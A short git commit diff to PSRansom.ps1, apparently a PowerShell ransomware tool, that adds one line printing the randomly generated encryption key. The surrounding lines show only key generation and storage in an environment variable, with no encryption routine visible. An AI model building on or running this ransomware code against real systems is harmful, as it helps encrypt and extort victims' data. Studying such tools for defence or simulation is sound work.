efdff3bc35bb72af8dd15b4d9fc2c14b968cacd2
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2025-02-26 10:09:45 +0900

    Update PSRansom.ps1

--- PSRansom.ps1
+++ PSRansom.ps1
@@ -330,6 +330,7 @@ else {
 
    Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+   Write-Host $PSRKey
    $env:PSRKey = $PSRKey
    Write-Host "[+] Recovery key saved in PSRKey environment variable"
 
